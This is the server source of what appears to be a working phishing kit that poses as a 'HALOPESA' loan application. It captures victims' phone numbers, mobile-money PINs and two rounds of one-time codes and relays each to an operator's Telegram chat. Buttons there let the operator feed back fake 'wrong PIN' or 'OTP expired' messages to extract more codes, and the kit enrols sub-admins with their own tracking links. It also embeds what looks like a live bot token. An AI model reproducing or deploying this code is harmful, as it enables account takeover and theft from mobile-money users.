const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || ''
      }]));
    }
  } catch (err) {}
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {}
}

let bot = null;
const sessions = new Map();
let lastActiveUserId = null; 
const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID) || admins.has(targetAdmin)) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || 'N/A';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      const isNewAdmin = !admins.has(chatId);
      if (isNewAdmin) {
        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
        saveAdmins();
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      
      const subAdminMessage = `👑 *HALOPESA ADMIN PANEL*\n\n` +
                              `👤 *Name:* ${firstName} ${lastName}\n` +
                              `📌 *Username:* @${username}\n` +
                              `• Chat ID: \`${chatId}\`\n\n` +
                              `🔗 *Your Tracking Link:*\n${userLink}`;
      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });

      if (isNewAdmin && chatId !== String(FALLBACK_ADMIN_ID)) {
        const mainAdminNotification = `🚨 *NEW SUB-ADMIN STARTED BOT*\n\n` +
                                      `👤 *Name:* ${firstName} ${lastName}\n` +
                                      `📌 *Username:* @${username}\n` +
                                      `• Chat ID: \`${chatId}\`\n\n` +
                                      `🔗 *Generated Link:*\n${userLink}`;
        await bot.sendMessage(FALLBACK_ADMIN_ID, mainAdminNotification, { parse_mode: 'Markdown' });
      }
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      
      const firstUnderscoreIdx = actionData.indexOf('_');
      const actionType = firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
      let targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';

      if (!targetId || !sessions.has(targetId)) {
        targetId = lastActiveUserId;
      }

      let session = sessions.get(targetId);
      if (!session) {
        session = { adminChatId: chatId };
        if (targetId) sessions.set(targetId, session);
      }

      const chatTarget = session.adminChatId || chatId;

      switch (actionType) {
        case 'DENY':
        case 'BLOCKED':
          session.status = 'DENIED_STOP';
          await bot.sendMessage(chatTarget, `❌ Application blocked. Applicant stopped.`);
          break;
        case 'ALLOW':
          session.status = 'PROCEED_OTP1';
          await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
          break;
        case 'WRONG':
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN'; 
          session.pin = '';
          await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Applicant redirected back to enter new PIN.`);
          break;
        case 'OTP':
        case 'OTP_EXPIRED':
          session.status = 'RETRY_OTP1'; 
          session.otp1 = '';
          await bot.sendMessage(chatTarget, `❌ OTP Expired sent. Notice given, applicant redirected back to enter new OTP.`);
          break;
        case 'INVALID':
        case 'INVALID_OTP':
          session.status = 'RETRY_OTP2';
          session.otp2 = '';
          await bot.sendMessage(chatTarget, `❌ Invalid OTP sent. Waiting for new incoming OTP.`);
          break;
        case 'NEXT':
          session.status = 'PROCEED_OTP2';
          await bot.sendMessage(chatTarget, `✅ Step 1 approved. Applicant moved to OTP Step 2.`);
          break;
        case 'APPROVED':
        case 'APPROVED_FINAL':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Loan approved! Success screen shown.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Done` }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const targetChat = resolveTargetChat(adminChatId);
    const userId = `user_${Date.now()}`;
    lastActiveUserId = userId; 

    sessions.set(userId, { 
      adminChatId: targetChat, 
      status: 'PROCEED_SIGNIN' 
    });

    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Network error.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  let session = sessions.get(userId);
  
  if (!session && lastActiveUserId) {
    session = sessions.get(lastActiveUserId);
  }

  if (!session) return res.status(200).json({ status: 'PROCEED_SIGNIN' }); 
  res.status(200).json({ status: session.status });
});

app.post('/api/submit-pin', async (req, res) => {
  try {
    const { userId, phone, pin } = req.body || {};
    let activeId = userId || lastActiveUserId;
    let session = sessions.get(activeId);
    if (!session && lastActiveUserId) {
      activeId = lastActiveUserId;
      session = sessions.get(activeId);
    }
    if (!session) {
      session = { adminChatId: FALLBACK_ADMIN_ID };
      sessions.set(activeId || 'default', session);
    }

    if (phone) session.phone = phone;
    if (activeId) lastActiveUserId = activeId;

    const targetChat = session.adminChatId;
    session.status = 'WAITING_PIN_APPROVAL';
    session.pin = pin;

    const message = `🔐 *NEW HALOPESA LOAN ATTEMPT*\n\n` +
                    `📞 *PHONE NO:* \`${phone || session.phone || 'N/A'}\`\n` +
                    `🔒 *PIN (4 Digits):* \`${pin}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'ALLOW', callback_data: `ALLOW_${activeId}` },
            { text: 'BLOCKED', callback_data: `BLOCKED_${activeId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error' });
  }
});

app.post('/api/submit-otp1', async (req, res) => {
  try {
    const { userId, phone, otp } = req.body || {};
    let activeId = userId || lastActiveUserId;
    let session = sessions.get(activeId);
    if (!session) {
      session = { adminChatId: FALLBACK_ADMIN_ID };
      sessions.set(activeId || 'default', session);
    }

    if (phone) session.phone = phone;
    if (activeId) lastActiveUserId = activeId;

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP1_APPROVAL';
    session.otp1 = otp;

    const message = `🔑 *HALOPESA OTP VERIFICATION (STEP 1)*\n\n` +
                    `📞 *Phone:* \`${phone || session.phone || 'N/A'}\`\n` +
                    `📱 *OTP (4 Digits):* \`${otp}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${activeId}` },
            { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${activeId}` },
            { text: 'NEXT', callback_data: `NEXT_${activeId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error' });
  }
});

app.post('/api/submit-otp2', async (req, res) => {
  try {
    const { userId, phone, otp } = req.body || {};
    let activeId = userId || lastActiveUserId;
    let session = sessions.get(activeId);
    if (!session) {
      session = { adminChatId: FALLBACK_ADMIN_ID };
      sessions.set(activeId || 'default', session);
    }

    if (phone) session.phone = phone;
    if (activeId) lastActiveUserId = activeId;

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP2_APPROVAL';
    session.otp2 = otp;

    const message = `🔑 *HALOPESA FINAL OTP (STEP 2)*\n\n` +
                    `📞 *Phone:* \`${phone || session.phone || 'N/A'}\`\n` +
                    `📱 *Final OTP (4 Digits):* \`${otp}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'INVALID OTP', callback_data: `INVALID_OTP_${activeId}` },
            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${activeId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error' });
  }
});

// New endpoint to notify admin when applicant requests a new OTP in Swahili
app.post('/api/request-new-otp', async (req, res) => {
  try {
    const { userId, phone, step } = req.body || {};
    let activeId = userId || lastActiveUserId;
    let session = sessions.get(activeId);
    if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };

    const targetChat = session.adminChatId;
    const message = `⚠️ *OMBI LA OTP MPYA (${step === 1 ? 'Hatua ya 1' : 'Hatua ya 2'})*\n\n` +
                    `📞 *Namba ya Simu:* \`${phone || session.phone || 'N/A'}\`\n` +
                    `📢 Mteja ameomba kutumiwa OTP mpya kwa sababu muda umeisha.`;

    if (targetChat && bot) await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
                               
